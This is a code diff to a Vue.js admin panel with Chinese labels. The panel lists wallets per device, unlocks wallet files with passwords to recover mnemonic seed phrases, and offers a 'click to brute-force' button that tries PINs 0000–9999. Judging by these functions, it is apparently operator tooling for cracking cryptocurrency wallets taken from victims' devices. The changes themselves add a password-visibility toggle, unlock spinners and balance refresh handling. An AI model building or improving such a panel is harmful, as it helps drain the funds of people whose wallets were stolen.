@@ -39,7 +39,7 @@
                 <td>{{ a.source || "—" }}</td>
                 <td>{{ a.chain }}</td>
                 <td class="mono">{{ a.address }}</td>
-                <td>{{ a.nativeBal || "0" }} / USDT {{ a.usdtBal || "0" }}</td>
+                <td>{{ a.balance ? a.balance : ((a.nativeBal || "0") + " / USDT " + (a.usdtBal || "0")) }}</td>
                 <td><button v-if="a.can_refresh" class="btn-link" @click="refresh(a)">刷新</button></td>
               </tr>
             </tbody>
@@ -84,8 +84,25 @@
               <button type="button" class="btn-link" @click="openWalletReveal(w)">完整查看</button>
             </div>
             <form v-if="w.unlockable" class="wallet-unlock" @submit.prevent="unlock(w)">
-              <input v-model="unlockPw[keyOf(w)]" type="password" :placeholder="unlockPlaceholder(w)" autocomplete="off" />
-              <button type="submit">解锁</button>
+              <div class="wallet-unlock-field">
+                <input v-model="unlockPw[keyOf(w)]" :type="unlockShow[keyOf(w)] ? 'text' : 'password'" :placeholder="unlockPlaceholder(w)" autocomplete="off" :disabled="!!unlocking[keyOf(w)]" />
+                <button type="button" class="wallet-unlock-eye" :aria-label="unlockShow[keyOf(w)] ? '隐藏密码' : '显示密码'" :title="unlockShow[keyOf(w)] ? '隐藏密码' : '显示密码'" :disabled="!!unlocking[keyOf(w)]" @click="unlockShow = { ...unlockShow, [keyOf(w)]: !unlockShow[keyOf(w)] }">
+                  <svg v-if="!unlockShow[keyOf(w)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" />
+                    <circle cx="12" cy="12" r="3" />
+                  </svg>
+                  <svg v-else viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <path d="M3 3l18 18" />
+                    <path d="M10.6 10.6a2.5 2.5 0 0 0 3.5 3.5" />
+                    <path d="M9.9 5.1A10.4 10.4 0 0 1 12 5c6.5 0 10 7 10 7a17.6 17.6 0 0 1-3.2 4.1" />
+                    <path d="M6.1 6.1A17.3 17.3 0 0 0 2 12s3.5 7 10 7a10.4 10.4 0 0 0 4.2-.9" />
+                  </svg>
+                </button>
+              </div>
+              <button type="submit" :disabled="!!unlocking[keyOf(w)]">
+                <span v-if="unlocking[keyOf(w)]" class="wallet-unlock-spin" aria-hidden="true"></span>
+                {{ unlocking[keyOf(w)] ? "解锁中" : "解锁" }}
+              </button>
             </form>
             <button v-if="w.brute" type="button" class="wallet-brute-btn" :disabled="!!bruteState[keyOf(w)]" @click="brute(w)">点击爆破</button>
             <div v-if="bruteState[keyOf(w)]" class="wallet-brute-inline">
@@ -146,7 +163,7 @@ export default {
   data() {
     return {
       detail: null, tab: "parse",
-      unlockPw: {}, bruteState: {},
+      unlockPw: {}, unlockShow: {}, unlocking: {}, bruteState: {},
       reveal: { open: false, kind: "", payload: null, title: "完整查看" },
       bruteModal: { open: false, title: "正在爆破", sub: "正在尝试 PIN 0000–9999，请稍候…", pct: 0, tried: 0, total: 10000 },
       order: { open: false, wallet: null, pkg: "", error: "", busy: false },
@@ -208,20 +225,34 @@ export default {
     },
     async refresh(a) {
       try {
-        await api.refreshBalance(this.detail.deviceId, { address: a.address, chain: a.chain });
+        const body = await api.refreshBalance(this.detail.deviceId, { address: a.address, chain: a.chain });
+        const d = (body && body.data) || {};
+        if (a.from_package && d.balance) {
+          a.balance = d.balance;
+          toast("已刷新");
+          return;
+        }
         toast("已刷新");
         await this.load();
       } catch (e) { toast(e.message, "err"); }
     },
     async unlock(w) {
+      const key = this.keyOf(w);
+      if (this.unlocking[key]) return;
+      this.unlocking = { ...this.unlocking, [key]: true };
       try {
         const body = await api.walletUnlock(this.detail.deviceId, {
-          fileName: w.source_file, password: this.unlockPw[this.keyOf(w)] || "", walletId: w.wallet_instance_id,
+          fileName: w.source_file, password: this.unlockPw[key] || "", walletId: w.wallet_instance_id,
         });
         const phrase = (body.data && body.data.phrase) || "";
         toast(phrase ? "解锁成功，已写入助记词" : "解锁成功");
         await this.load();
       } catch (e) { toast(e.message, "err"); }
+      finally {
+        const next = { ...this.unlocking };
+        delete next[key];
+        this.unlocking = next;
+      }
     },
     async brute(w) {
       try {
